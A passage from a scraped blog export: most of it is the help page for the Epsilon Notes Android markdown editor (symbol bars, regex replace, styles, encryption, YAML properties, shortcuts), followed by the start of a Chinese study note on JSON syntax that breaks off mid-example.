is used to separate the symbols in the symbol bar settings.\nTo add commas and enter (line feed) symbols to your symbol bar, use: \\\\, and \\\\n or \\\\r\n\\\\n will send Enter and two SPACES to your document.\n\\\\r will send only Enter (for using in codeblocks and YAML for example).\nFor example:\nfw:Sincerely yours\\\\,\\\\nEugene  will produce a fw (farewell) symbol on the symbol bar, pressing which will send your document the text:\nSincerely yours,\nEugene\nSymbol bar reserved words: Symbol bars have reserved words. For example: BOLD, ITALIC, UNDERLINE, STRIKETHROUGH, HIGHLIGHT, SUPERSCRIPT, CODEBLOCK, FONTCOLOR, which correspond to the formatting presets:\nBOLD, ITALIC, ++UNDERLINE++, STRIKETHROUGH, ==HIGHLIGHT==, ^^SUPERSCRIPT^^, CODEBLOCK, FONTCOLOR.\nWith these buttons it easy to combine several commonmarks. Just press them one after another. For example:\n**_++~~bold, italic underline and strikethrough~~++_**  will produce\n++bold, italic underline and strikethrough++\n The font color icon will produce the text:\u0026lt;font color=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/font\u0026gt;. To make GREEN TEXT, fill in the preset as follows: html \u0026lt;font color=\u0026quot;green\u0026quot;\u0026gt;GREEN TEXT\u0026lt;/font\u0026gt;   See the list of available color names here.\nLine quick selection icon: This icon selects line from the current position to the nearest enter sign.\nMake frequent use of this button when you need to move paragraphs from one part of the text to another. Now, you can do everthing with the help of the symbol bar - like: select several lines, cut them and paste elsewhere.\nSORTLINES button:\nTo sort a few lines, place the cursor at the beginning of the line, select the lines using the QUICKSELECTION button, and press the SORTLINES button.\nTo perform reverse sorting, make a long tap on the button.\nRecommended use: bullet lists and table lines.\nPreview in Edit Mode: The PRINTPREVIEW button on Symbol Bar No. 2 can view your changes in the rendered view before saving or cancelling them. External links do not work in the preview mode.\nIf you want to restore your symbol bars, make a long tap on the button with the number of the Symbol Bar in the Edit mode and Reset symbol bars 1 and 2.\nTo Top and To Bottom: The symbols called \u0026ldquo;TOTOP\u0026rdquo; and \u0026ldquo;TOBOTTOM\u0026rdquo; are used jump to the top or bottom of the document, respectively.\nUndo and redo: The symbols are called UNDO and REDO. These operations work well, but may interfere a little with the T9 function. So, if you have autocompletion on, the autocompletion may try \u0026ldquo;to participate\u0026rdquo; in the insertion of changes in the buffer from time to time. When the edit window loses focus (save or find operations), the undo/redo buffer becomes reinitialized.\nSymbol bar operations\nThe position of each symbol bar is remembered when switching them during the edit session. Alternatively, you can set the position of each symbol bar to reset at each switching (via Preferences).\n- Tap on the Number Button: * switch to the next Symbol Bar\n- Swipe (touch\u0026amp;move) on the Number Button: * switch to the previous Symbol Bar\n- Long tap on the Number Button: * Go to Symbol Bars settings\nReplacement（查找替换） Icon location: Symbol Bar No. 2.\nReplacement uses Regex.\nWhat is regex?（何为正则表达式） Regex means \u0026ldquo;Regular Expressions\u0026rdquo;, that are used to make special replacements in the text. There is a lot of information on regex in Internet, for example at http://www.regular-expressions.info/quickstart.html.\nIf you enter this regex:\n\\b(c.t)\\b  (where \\b stands for word boundary, dot means any letter, and brackets indicate the group of letters No. 1)\nand this replacement:\n[$1]($1.md)  (where $1 means the first group of letters from the previous expression)\nThen all 3-letter words starting in \u0026ldquo;c\u0026rdquo; and ending in \u0026ldquo;t\u0026rdquo; (cut, cot, cat etc.) will be converted into Commonmark links.\n[cat](cat.md) [cot](cot.md) [cut](cut.md)  If you need help with Regex, join the Google+ community at: Google Plus Epsilon Notes Community.\nLive preview（实时预览） Available in Premium Version\nThe edit move has a live preview option for tablets. You can write your texts and observe their rendering in real time. The limit in the free version is 500 symbols\n\nTap on the picture to see it in the browser\n\n\nTo enable live preview - switch it on in the preferences or long press the Save button.\nNota Bene:\nThis function is not disabled for phones, so it is up to you to decide whether to use it or not on a small screen.\nA few remarks on this mode:\n On small screens, you can use PRINTPREVIEW button on Symbol Bar No. 2. Live preview position is not synchronized with the edit field. You have to synchronize it yourself. Live preview is delayed a second after you stop typing to prevent lags in typing.  Preferences Menu In the Prefereces menu you can set the following functions * Default file extension,which will be used whenever a file extension is needed, but not specified by the user (for example, when creating a new file) * Number of browser preview lines (1-4) * FLOATING BUTTON: show/hide * FONT SIZE: set the rendered font size and many others\nSend note as attachment You can send your note as attachment over email. (`Menu → Export → Send attachment\u0026rdquo;).\nEpsilon Notes will add an instruction on viewing the file to the letter body.\nCSS styles Styling output: You can style your output by inserting your style via Preferences. Examples of style:\nTo make pictures take only 20% of the screen:\nimg{width:20%;}  Center tag \nTo center a paragraph, use the following tags\n\u0026lt;center\u0026gt; ***Centered paragraph*** \u0026lt;/center\u0026gt;  which will produce:\n\nCentered paragraph\n\nNote: There must be empty lines before and after the tags.\nKbd tag If you write a note about some keyboard shorcuts, use kbd tags. Writing \u0026lt;kbd\u0026gt;Ctrl\u0026lt;/kbd\u0026gt; + \u0026lt;kbd\u0026gt;A\u0026lt;/kbd\u0026gt; will render to Ctrl + A.\nDefault styles（默认样式） There are 4 default styles, that are fully customizable.\n You can add one more style - \u0026ldquo;User Style\u0026rdquo; You can restore the default styles. You can switch among the styles from the Menu  Here is an example of one of the styles:\nWhite Style\n   Characteristic Description     Aspect High contrast white-paper, mostly black and white   Purpose Enhanced visibility under light    Instead of writing the whole style in the Preferences, you can provide the link to your style in one of the format:\nfile:///storage/sdcard0/....../your_style.css http://www.your_site.com/your_style.css https://www.your_site.com/your_style.css  Note: Path to style is supported only if it starts with a prefix such as http:// (several letters, a colon and two slashes). If your style file is in the Internet, it is recommended to copy it locally.\nYou can also use YAML to provide styles for individual documents. See here.\nStyles and Edit Mode:\nThe activated style automatically changes the style of the Edit mode.\n   Style Edit mode     Day Day   Night Night   White White   Black Black   User Select the setting in Preferences by checking / unchecking the box \u0026ldquo;Light theme in Edit mode\u0026rdquo; in the CSS section.    Privacy（隐私设置） You can use Epsilon Notes to store your private information.\nThe menu has an option called Security. Note encryption is AES + Base64 algorythm.\nTo encrypt your note, you need to set up the current session password and then encrypt it.\nThe security submenu has the following options:\n Peek: (Premium) Shows the current document unencrypted without saving it.\nIf your note was password protected, you need to enter the Session Password first. Encrypt: Encrypts and saves your document. Decrypt: Decrypts and saves your document. Session Password: Sets up the password used in the current session (valid until you exit Epsilon Notes).\n Your session password is used to generate a unique AES encryption key.\n The key and the password are kept in program current variables and they are not saved anywhere. When you exit the program, this data is deleted.\n  \nIf you forget your password, it will be impossible to restore your encrypted note..\n==Remember to backup important information.==\n\n When you set up a session password, a star will appear next to the title in the top bar, indicating that the password is active. If you do not set up the password, a password-free encryption will be used. You can use this encryption for a quick encryption, for example, before sending your text over email.  Privacy statement: Epsilon Notes does not send any data or files over Internet. It does not have any hidden permissions or activities. Epsilon Notes ++dowloaded from Google Play++ is safe for the privacy of the data on your device.\nSharing and Templates（分享＆模板） Share / Template Sharing:\nWhen you select text in Internet and share it to Epsilon Notes, you will be prompted to add a comment (which you may leave blank), and the shared texts with the comment will be saved to the folder storage/emulated/0/Epsilon (or a similar folder on older devices).\nGo on reading articles and sharing text from time to time. All the shared texts are saved.\nLater, when you return to Epsilon Notes, insert the shared texts in the Edit mode by pressing the INSERT button on Symbol Bar No.2.\nAfter you insert the text, you will be asked to delete the file, only if its name is written in a timestamp format (e.g., 2017-01-18-11-48-23).\nFiles with other names in storage/emulated/0/Epsilon are regarded as permanent templates. So, you will not be prompted to delete them.\nTemplates:\nYou can use the storage/emulated/0/Epsilon folder to add your templates (save files with .text extension). Inserting the templates is the same as inserting the shared texts.\nNote: if you do not see the .text files in the Epsilon folder, check if everything is fine with the Text files filter in the Preferences (no spaces, only extensions, including .text extension).\nMarkdownifying an internet article（网络文章 markdown格式化） Markdownifying to the buffer（markdown格式化 到缓存区） The best markdownifier is offered by the site:\nhttp://f*ckyeahmarkdown.com\nIf you are sharing a link to Epsilon Notes, there will be a button \u0026ldquo;Markdownify\u0026rdquo; in the dialog. When you press this button, Epsilon Notes will try to redirect the link to the above-said site and retrieve the text in markdown from there.\nIn case of instability（不稳定性）, you can turn this service off in the Preferences.\nHere is the scheme to use the Markdownifier（markdown格式化步骤）:\n Open the browser Proceed to the site with an article that you want to copy to the Epsilon Notes buffer In the menu of the browser next to the URL bar, select Share\u0026hellip; Select Epsilon Notes  If you did everything correctly, you will have the option MARKDOWNIFY appear in the dialog.  Select Markdownify Later on - when you are in Epsilon Notes again, use the INSERT button to import the markdownified article.  Shared data buffer in View mode You can view the contents of the Shared data buffer through Menu \u0026gt; Buffer.\nA tap on an item will copy it to Clipboard.\nCommonmark（Commonmark语法） Paragraphs and new lines（段落与换行） For a new paragraph, press Enter two times.\nParagraph 1 (blablabla) [Enter] [Enter] Paragraph 2  You will see:\nParagraph 1 (blablabla)\nParagraph 2\n\nTo break a line, the line should end\n(i) with two spaces or\n(ii) with \\ character.\nThus:\nWhat is this life\\ if full or care\\ We have no time [write 2 spaces at the end] to stand and stare.  will result in\nWhat is this life\nif full or care\nWe have no time\nto stand and stare.\nThe backslash \\ character is also used to override any other Commonmark symbol.\nHeadings（标题） If you write:\nHeading 1 ========  In the reading mode you will see\nHeading 1 If you write\nHeading 2 --------  You will see\nHeading 2 Alternatively, you can use the # symbol followed by a space in the beginning of a line.\n# Heading 1 ## Heading 2 ### Heading 3 #### Heading 4 ##### Heading 5 ###### Heading 6  Which will result in:\n Heading 1   Heading 2   Heading 3   Heading 4   Heading 5   Heading 6  \nLinks to headings You can make links to headings based on the heading text, for example:\n### My Heading Lorem ipsum... [Reference](#my-heading)  Thus will result in\nMy Heading  Lorem ipsum\u0026hellip;\nReference\nTo convert a heading to a link, you should observe the following rules:\n1) Use only one # in the link 2) All capital letters become small 3) All non letter symbols become a hyphen\nExample, the link to a heading\n# My Heading, Part 1  is\n[Link](#my-heading-part-1)  If it is hard to write links to headings, use anchor tags.\nItalic, bold, underline, strikethrough, highlight To write text in italic, surround the italicized text with * or _ characters. To write text in bold font, surround the bold typed text with ** (two asterisks) or __ (two underscores) characters.\nFor underlining, use ++, and for strikethrough - use ~~, for highlighting - use ==, for superscript - use ^^\nFor example, if you write:\nIn this _text_ I use the *italic* font.\\ In this __text__ , I use the **bold** font.\\ And now I use ++underline++ and ~~strikethrough~~\\ This text contains ==highlight== and ^^superscript^^  In the reading mode, you will see:\nIn this text I use the italic font.\nIn this text , I use the bold font.\nAnd now I use ++underline++ and strikethrough\nThis text contains ==highlight== and ^^superscript^^\nYou can combine italic and bold by writing - _**italic and bold**_ - __*italic and bold*__ - ***italic and bold*** - ___italic and bold___\nall of which will produce: italic and bold.\nLinks, pictures, paths（链接、图片、路径） To write a link, simply write it. For example, http://google.com will produce: http://google.com\n Pressing a link to Internet, opens the device\u0026rsquo;s browser.  To write a link covered with a name, use the format [name](http://link.com]. For example: [This link leads to google](http://google.com) will give you:\nThis link leads to google\nTo make a link to a picture in the internet, use ![name](http://link.com/picture.jpg) format. For example: ![face book icon](https://www.facebook.com/images/fb_icon_325x325.png) will result in:\n#section1 img{width:20%} \nYou can add relative path to your pictures in the current folder: ![My picture](my_picture.jpg)\nYou can add relative paths to other Commonmark files: * [File in this folder](my_file.txt) * [File in subfolder](subfolder/my_file.txt) * [File in superfolder](../my_file.txt)\nYou can insert pictures from your Gallery to your notes. To do that, press the image button on the edit-mode symbol bar.\nYou can view pictures by clicking on the picture name in the file browser. Press back to return to your document. After you view a picture, it\u0026rsquo;s path is stored in the ClipBoard, so you can paste it to your document.\nWhen you long press an item in the file browser, the context menu will offer you to copy the absolute link to the file to Clipboard.\nLinks to files without extension（不用扩展，给文件添加链接）  Normally, you write a link in the format [Link](myfile.txt). It is not necessary to add .txt at the end of the file name. When the extension is omitted, the default file extension (.txt, .cm, .md, .mkd or .markdown) is added automatically, depending on the extension you have chosen in the Preferences. Thus, if you have set .md as the default extension, clicking on the link \u0026ldquo;[File](some_name)\u0026rdquo; will send you to the file some_name.md  Links to inexistent files（链接到不存在的文件，点击时会创建新文件）  You can create a new file in the current folder by writing the name of an inexistent file: [My New File](my_new_file.txt) and it will automatically be created once you try to click on it in the viewer mode. You can use relative paths for inexistent files. Epsilon Notes will attempt to create a file, but the correct link back is not guaranteed. If it creates a lot of \u0026ldquo;garbage files\u0026rdquo;, you can disable this feature in the Preferences.  Links to sections in documents（链接到特定文档特定区域）  You can make links to headings inside the document. See how. You can make a link to some section in another document. If the section exists, the document will be scrolled thereto automatically. The format of the link is: [Link to Section](another_document.txt#section). You can use headings in other documents as section names. For example, to make a link to the heading ### My welcome in a document called Hello.txt, write [Link to My welcome](hello#my-welcome)  Note on SPACES in links（注意链接中的空格）  You must use URL format in links. It means you must use %20 instead of spaces!  Thus:\n\u0026emsp;NO -  [File in this folder](my file.txt)\n\u0026emsp;YES -  [File in this folder](my%20file.txt)\nSee details on Commommark specifications here.\nTelephone links（电话号码链接） You can make a telephone link in one of the following formats:\n[My telephone](tel:+1-234-456-78-90) \u0026lt;tel:+1-234-456-78-90\u0026gt; tel://+1-234-456-78-90  which will render to one of the following:\nMy telephone\ntel:+1-234-456-78-90\ntel://+1-234-456-78-90\nIn-text TOC（文档中间添加目录）  You can place table of contents in any place of your document. Write [TOC] preceded and followed by an empty line. The format is:  \u0026lt;-- empty line [TOC] \u0026lt;-- capital letters \u0026lt;-- empty line  Anchor tags（锚标签） Anchor tag \u0026lt;a name=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; is one of the buttons in the symbol bar 2. The shorcut word for the anchor tag is ANCHOR.\nTo make links inside your document, you can insert an anchor tag at some point in your text and jump to that part of the text from other places. Commonmark standard doesn\u0026rsquo;t have a symbol for anchors. But you can use HTML in your text. The html anchor tag looks like this: \u0026lt;a name=\u0026quot;tag_name\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;. And you can make link to it by writing in Commonmark: [Some description](#tag_name).\nIt works this way:\n\u0026lt;a name=\u0026quot;my_anchor\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; ### This is a heading with an anchor Lorem ipsum... and all that stuff... [Return to the heading with an anchor](#my_anchor)  will produce:\n  This is a heading with an anchor \nLorem ipsum\u0026hellip; and all that stuff\u0026hellip;\nGo to the heading with an anchor\nQuotes（引用） To write quotes, use \u0026gt; at the beginning of the line.\nFor example:\n\u0026gt; Eternity: a moment standing still for ever \u0026gt; \u0026gt; _James Montgomery_  will produce: \u0026gt; Eternity: a moment standing still for ever \u0026gt; \u0026gt; James Montgomery\nTables（表格） To draw table, just \u0026ldquo;draw it\u0026rdquo;. For example, like this:\n| Heading 1 | Heading 2 | | ----------- | ----------- | | cell 1 | cell 2 | | cell 3 | cell 4 | | cell 5 | cell 6 |  Or like this:\nHeading 1 | Heading 2 ----------- | ----------- cell 1 | cell 2 cell 3 | cell 4 cell 5 | cell 6  Which will produce:\n   Heading 1 Heading 2     cell 1 cell 2   cell 3 cell 4   cell 5 cell 6    You can position the contents of cells by placing a colon in the second line, indicating the position, for example:\n| Left | Center | Right | | :--- | :---: | ---: | | cell 1 | cell 2 | cell 3 | | cell 4 | cell 5 | cell 6 |  will produce\n   Left Center Right     cell 1 cell 2 cell 3   cell 4 cell 5 cell 6    Cells can vary in width and do not need to be perfectly aligned within columns. There must be at least three hyphens in each column of the header row.\n| Aspect | Description | | --- | --- | | status | New document | | difference | Awesome differences |  Rendered table with varied cell width\n   Aspect Description     status New document   difference Awesome differences    When you press Insert Table button, it inserts a \u0026ldquo;borderless\u0026rdquo; commonmark table tag, which is easier to fill in.\nFill it in as follows:\nHeader 1 | Header 2 --- | --- Cell 1 | Cell 2 Cell 3 | Cell 4  Surround tables with \u0026lt;noheader\u0026gt; and \u0026lt;/noheader\u0026gt; tags if they should appear without headers. Example:\n\u0026lt;noheader\u0026gt; Any text | ... ----------|--- A | B C | D \u0026lt;/noheader\u0026gt;  \n   \u0026hellip; \u0026hellip;     A B   C D    \nCode blocks（代码块） To write code, use three backticks (```) in the beginning of the code and at the end of the code. For example:\n``` procedure hello_world begin writeln (\u0026quot;Hello world\u0026quot;); readln(); end. ```  will show:\nprocedure hello_world begin writeln (\u0026quot;Hello world\u0026quot;); readln(); end.  Instead of backticks, you can use several ~ signs.\nYou can also write code by identing a line with four spaces. (Use TAB button for that). For example, in the next block, each line starts with 4 spaces, instead of backticks:\n10 CLS 20 PRINT \u0026quot;Hello world\u0026quot; 30 INPUT A$ 40 END  Utility for programmers:\n To highlight codeblocks in all documents, select the appropriate setting in Preferences-\u0026gt;Enable Plugins\n To disable highlighting codeblocks in individual documents, add YAML:\n--- code: none ...  When writing codeblocks, to help Epsilon Notes understand how to highlight it, you can specify the programming language. For example,\n  ```java public class HelloWorld { public static void main(String[] args) { // Prints \u0026quot;Hello, World\u0026quot; to the terminal window. System.out.println(\u0026quot;Hello, World\u0026quot;); } ```  will produce\npublic class HelloWorld { public static void main(String[] args) { // Prints \u0026quot;Hello, World\u0026quot; to the terminal window. System.out.println(\u0026quot;Hello, World\u0026quot;); }  to prevent highlighting, write none next to the three backticks:\n```none public class HelloWorld { public static void main(String[] args) { // Prints \u0026quot;Hello, World\u0026quot; to the terminal window. System.out.println(\u0026quot;Hello, World\u0026quot;); } ```  which will produce a non-highlighted code\npublic class HelloWorld { public static void main(String[] args) { // Prints \u0026quot;Hello, World\u0026quot; to the terminal window. System.out.println(\u0026quot;Hello, World\u0026quot;); }  Bulleted and numbered lists（项目符号和编号列表／无序有序列表） Examples\n++Bullet lists++\n* Point 1 * Point 2 * Sub-point 2.1 * Sub-point 2.2 Or - Alternative point 1 - Alternative point 2 - Alternative sub-point 2.1 - Alternative sub-point 2.2 Or + Alternative point 1 + Alternative point 2 + Alternative sub-point 3.1 + Alternative sub-point 3.2  Any of which will produce:\n Point 1 Point 2  Sub-point 2.1 Sub-point 2.2   ++Numbered lists++\n1. Point 1 1. Point 2 1. Sub-point 2.1 1. Sub-point 2.2 1. Point 3 Or 1) Point 1 1) Point 2 1) Sub-point 2.1 1) Sub-point 2.2 1) Point 3  will produce\n Point 1 Point 2  Sub-point 2.1 Sub-point 2.2  Point 3  It does not matter what number you write in a numbered list. It is numbered ==automatically==.\nHTML（HTML 语法应用） If some functions are needed, but not provided in this editor, you can use html directly in the text. For example, the html tag \u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt; text \u0026lt;/font\u0026gt; is used to make RED TEXT .\nHorizontal rule（水平线） To draw a horizontal rule, write - - - or * * * on a new paragraph.\nFootnotes（脚注）  Footnotes. You can make reference to a footnote as [^footnote]. The reference back is the same, but with colon at the end [^footnote]: For example: the footnote [^comment] will look like this2.  Commonmark full reference（Commonmark 完整参考） For full Commonmark referrence proceed to the link:\nhttp://commonmark.org/help/\nTo see all available YAML properties, tap here\nYAML（YAML 语法） Using YAML headers tells Epsilon Notes what you need or you don\u0026rsquo;t need in your document. Especially, regarding the MathJax and ABC notation plugins. It is strongly advisable to use these headers, rather than the global settings of the Preferences.\n\nTo read about Mathjax and ABC, go to Menu → Help → For advanced users\n\nDescription（说明） Note 1: You can disable the YAML title display settings in the Preferences.\nNote 2: To see all available YAML properties, tap here\nYou can add some meta-data at the very beginning of the document in the format:\n--- title: Mémoirs author: Queen Elizabeth description: Majestic biography ...  Or\n--- title: Mémoirs author: Queen Elizabeth description: Majestic biography ---  This meta-data is not shown in the rendered mode, but can be used for your information, when you switch to the edit mode or as metadata for third-party Markdown processors, which support YAML.\nThis information is also used to switch on plug-ins and styles in your documents.\nYAML and Plugins: Use Yaml, if you want to include some features only in some documents, and not in others. For example, if you have 5000 documents, of which only 3 documents use formulas or music notes, then ++it is better to turn off the MathJax and ABC Notation plug-ins in the Preferences and to turn them on only in the documents that use them.++ (See help on Mathjax and ABC in the help section for advanced users.)\nTo customize the view and plug-ins in one document, use YAML, or document properties, in the very beginning of the document in the following format:\n--- property:value ...  or\n--- property: - value 1 - value 2 ...  Epsilon Notes supports the following properties: title, toc, uses and style, and the following values:\n value for title: the title of your document. value for toc: the title of the table of contents section. values for uses  mathjax abc  values for style  day night white black user nostyle   \nYou can personalize style individually in files.\nto refer to the stylesheet mystyle.css in the current folder\n--- style: mystyle.css ...  to provide an absolute link to your style file.\n--- style: file:///storage/emulated/0.../mystyles.css ...  to provide a link to your style in the Internet\n--- style: http://www.mysite.com/mystyle.css ...  NOTA BENE: Clear cache!\nWhen you change styles or use MathJax, the view, which shows the rendered document, caches some elements (for example, css and MathJax scripts loaded from external sources), so you can continue using these elements even offline. If you want css and MathJax to re-initialize, clear the cache. Menu → Clear cache\n\nTo read about Mathjax and ABC, go to Menu → Help → For advanced users\n\nTitle: If you want your document to show the title, write at the top of the document:\n--- title: My Title ...  Table of Contents: If you want your document to have the table of contents based on the headings contained in your document:\n--- toc: Name of the Table of Contents section ...  You can combine the properties, for example like this:\n--- title: My Book toc: Contents ...  which will generate the following text layout:\nMy book  Contents  - heading one - heading two - heading three\nMain text\u0026hellip;\nIf you want your document to use MathJax or ABC Notation, you have to write in the very beginning of the document:\n--- uses: mathjax ...  or\n--- uses: abc ...  if the document uses both MathJax and ABC notation, then write at the top of the document:\n--- uses: - mathjax - abc ...  To read more about Mathjax and ABC, go to Menu → Help → For advanced users\nIf you want your document to be rendered in the day style, write at the top of the document:\n--- style: day ...  Five styles are supported: day, night, white, black and user.\nIf you want your document to use MathJax, ABC notation and be rendered in the white style, write the following declaration at the top of your document:\n--- uses: - mathjax - abc style: white ...  Another example of using the individual document setting:\n--- title: Psychology of White Mice toc: Contents of the Article uses: - abc - mathjax style: white ...  This document header will generate the title and the table of contents at the top of the document, and will force Epsilon Notes to use ABC notation and MathJax rendering, and will apply the white css theme.\nOnce again, mind the YAML format, for example:\n--- uses: abc ...  but\n--- uses: - abc - mathjax ...   You can add date to your YAML header, which will be displayed at the top of the screen under the title.\n--- date:2016-10-29 ...  Use YAML for autonumbering headings (starting from level two)\n--- heading: autonumber ...  Use YAML for headings to trigger scrolling to the top of the document when pressed.\n--- heading: totop ...   Use YAML for material color styles!（用YAML制作实用颜色样式） ☆ Theme names（主题名称） \nPremium Version ☆\n\nYour documents can be painted to colors proposed for the Material Design here.\nThe names of the styles correspond to their colors.\nHere are the extreme shades of the styles:\n red  red-light    pink  pink-light    purple  purple-light    deeppurple  deeppurple-light    indigo  indigo-light    blue  blue-light    lightblue  lightblue-light    cyan  cyan-light    teal  teal-light    green  green-light    lightgreen  lightgreen-light    lime  lime-light    yellow  yellow-light    amber  amber-light    orange  orange-light    deeporange  deeporange-light    brown  brown-light    grey  grey-light    bluegrey  bluegrey-light    \nThe free version contains only two colors for testing purposes:\nblue\nblue-light\nAll other colors are in the Premium Version\n\nUsing Themes with the help of YAMLs （借助YAMLs设置主题）☆ To paint your page into one of the material colors, you need to add the following YAML declaration at the top of the page:\n--- Style: blue ...  Or any other color (in the Premium Version). For example, for ❤love stories❤, you can use the following style:\n--- Style: pink-light ...  You can write the following YAML at the top of your document to make it show a different style every time you open your note:\n--- Style: random ...  You can make only light or dark styles switch on randomly:\n--- Style: random-light ...  or\n--- Style: random-dark ...  Appbar color（app颜色自适应设置） Appbar YAML. If you use a user style and you want the application bar have a specific color, you can use the YAML as follows:\n--- Appbar: blue ...  Note: use one of the material colors corresponding to a theme.\nView mode fonts（视图模式字体） Use Yaml to provide path to a local font in an individual file, fo example:\n--- Font: file:///storage/.../HelveticaNeue Light.ttf ...  Setting themes as defaults（设置默认主题） ☆ You can use a name of the style to set it as default instead of the standard CSS styles.\nFor example, if you wish the bluegrey style to be used as the default night style, go to the Preferences \u0026gt; CSS Styles \u0026gt; Night Style, delete the whole style text, and write there bluegrey. After you exit the Preferences, this field will automatically be filled with the bluegrey style. (Note: Premium function).\nDisabling theme YAMLs（禁用YMALs主题） If you provided style YAMLs in all of your notes, and after some time, you feel tired of so many colors, you can turn off the material color styles in the Preferences \u0026gt; YAML preamble \u0026gt; Allow styles.\nIn this case, only the default 5 styles will be working (day, night, white, black, user).\n\nAll available YAML properties（所有可用的 YAML 属性）    YAML Meaning     appbar:blue Sets a material color for the application bar   back:filename (deprecated) File to open on pressing the back button   code:highlight (deprecated) Highlight codeblocks   code:none Do not highlight codeblocks   date:2016-11-20 \u0026nbsp;3 Show this date at the top   Font: file:///storage/ \u0026hellip; /HelveticaNeue Light.ttf Setting a font for the view mode   heading:autonumber Autonumbering headings from level 2   heading:totop Tapping on a heading scrolls the page to top   prerender:|\nregex1\nreplacement1\nregex2\nreplacement2\n Preprocessing in a document   style:black Force black style   style:day Force day style   style:night Force night style   style:white Force white style   style:user Force user style   style:nostyle Turn off any style in the document. You can provide an inline style then.   style:file.css 3 Use the file.css from the current directory   style:http://../style.css Use style from Internet   style:file:///../style.css Specify absolute link to the style   title:some_name\u0026nbsp;3 Generate title. Can be turned off via Preferences   toc:some_name\u0026nbsp;3 Generate Table of contents   toc-style:inline Place ToC in one centered line   uses:abc Turn on ABC Music Notation plugin. See help for advanced users.   uses:mathjax Turn on MathJax plugin. NB: The plugin is cached from the Internet. Due to its high weight, it was not included in the app. See help for advanced users.    Reminder:\nTo use several values for one property, write:\n--- heading: -autonumber -totop ...  Miscellaneous(混杂的／其他) Print PDF（PDF 打印） Create pdf documents from the current view using Android\u0026rsquo;s standard pdf printer. To do that, go to Menu-\u0026gt;Print PDF. The program first prepares the view and then offers to send it to the pdf printer.\nNOTA BENE: This function is available only with Android 4.4 and above.\nJQuery（支持jQuery库）  JQuery library is included for writing extended javascripts in documents.  Keyboard shortcuts for Edit Mode（编辑模式下的快捷键） Standard English keyboard. Tested on a bluetooth keyboard \u0026ldquo;Genius\u0026rdquo; and on-screen \u0026ldquo;Hacker\u0026rsquo;s keyboard\u0026rdquo;.\n   Kbd\u0026nbsp;shortcuts Action and mnemonic     Ctrl+A Select All   Ctrl+B Bold   Ctrl+C Copy   Ctrl+D Insert Date   Ctrl+E Strikethrough (Erase)   Ctrl+F Insert Font Color tag \u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt;\u0026lt;/font\u0026gt;   Ctrl+G Open Gallery to insert picture   Ctrl+H Highlight   Ctrl+I Italic   Ctrl+J Tab (Jump 4 spaces)   Ctrl+K Hide / show symbol bar (Keyboard) (Beware not to lose your Symbol Bar!!!)   Ctrl+L Select Line   Ctrl+M Insert from shared text or template Buffer (iMport)   Ctrl+N Insert aNchor with a Name \u0026lt;a id=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;   Ctrl+O sOrt selected lines (Reverse sort is available only through the long-tap on the on-screen symbol bar. To select several lines, use Ctrl+L)   Ctrl+P Preview and Print   Ctrl+Q Cancel edit (Quit - press button twice!)   Ctrl+R Regex Replace   Ctrl+S Save and exit edit mode   Ctrl+T Insert Table   Ctrl+U Underline   Ctrl+V Paste (Paste is Very close to the Cut button)   Ctrl+W Redo (Above the undo button)   Ctrl+X Cut (eXtract)   Ctrl+Y Insert codeblock (cYber-language)   Ctrl+Z Undo (Undo all my errorZ and miZtakes)    Additional shortcuts（附加快捷键）    Kbd\u0026nbsp;shortcuts Action     Ctrl+5 Jump to the top of the document   Ctrl+6 Jump to the bottom of the document   Ctrl+Shift+C Alternative insert Codeblock   Ctrl+Shift+F Insert Footnote   Ctrl+Shift+H Show Help   Ctrl+Shift+S Insert Superscript   Ctrl+Shift+Z Alternative Redo button (See Ctrl+W)    NB: Soft keyboards may not support some keys.\nShow / hide Symbol bar（显示／隐藏 符号条） If you work with a keyboard, you can hide the Symbol bar. Most of its functions are available through shortcuts. To hide it, uncheck the option at: Menu - Preferences - Symbol bars - Show symbol bar\nTo show or hide it while working, press Ctrl+K.\n______________\nFootnotes（脚注） The symbol bar reserved words are:\n ANCHOR BOLD CANCEL CODEBLOCK COPY CUT DATE FOOTNOTE HELP HIGHLIGHT IMG ITALIC PASTE PRINTPREVIEW QUICKSELECTION REDO REGEXREPLACE SELECTALL SELECTLEFT SELECTRIGHT SORTLINES STRIKETHROUGH SUPERSCRIPT TAB TABLE TOBOTTOM TOTOP UNDERLINE UNDO   The U.S. Government announced that AES could be used to protect classified information. Source\n  [return] ==Hey, the comment is here!== The back tag looks like [^comment]: It is at the beginning of this line. Click on it to return. [return] The value is arbitrary\r[return]   ","permalink":"http://localhost:8000/public/post/epsilon-notes-help/","tags":["Epsilon Note"],"title":"Epsilon Notes Help"},{"categories":["学习笔记"],"contents":" 要点： 1.理解json语法 2.解析json 3.序列化json  XML 与 JSON 都可以理解为在互联网上传输结构化数据的一种格式。XML 先于 JSON，但由于 ==XML 过于繁琐、冗长==，继而就又出现了 JSON。\nJSON 是JavaScript 的一个严格的子集，利用了JavaScript中的一些模式来表示结构化数据。Crockford认为与XML相比，JSON是在JavaScript中读写结构化数据的更好的方式。因为==可以把JSON直接传给eval()，而且不必创建DOM对象==。另外，更重要的一个原因是，可以把JSON数据结构解析为有用的JavaScript对象。与XML数据结构要解析成DOM文档而且从中提取数据极为麻烦相比，JSON可以解析为JavaScript对象的优势极其明显。\n关于JSON，最重要的是要理解它是一种数据格式，不是一种编程语言。虽然具有相同的语法形式，但JSON并不从属于JavaScript。而且，并不是只有JavaScript才使用JSON，毕竟JSON只是一种数据格式。很多编程语言都有针对JSON的解析器和序列化器。 语法 JSON的语法可以表示以下三种类型的值。\n 1.简单值：使用与JavaScript相同的语法，可以在JSON中表示字符串、数值、布尔值和null。但JSON不支持JavaScript中的特殊值undefined。 2.对象：对象作为一种复杂数据类型，表示的是一组有序的键值对儿。而每个键值对儿中的值可以是简单值，也可以是复杂数据类型的值。 3.数值：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中的值。数组的值也可以是任意类型——简单值、对象或数组。  简单值 简单值中，JSON字符串与JavaScript字符串的最大区别在于，JSON字符串必须使用双引号（单引号会导致语法错误）。\n对象 JSON中的对象与JavaScript字面量稍微有一些不同。下面是一个JavaScript中的对象字面量：\nvar person = { name: \u0026quot;Nicholas\u0026quot;, age: 29 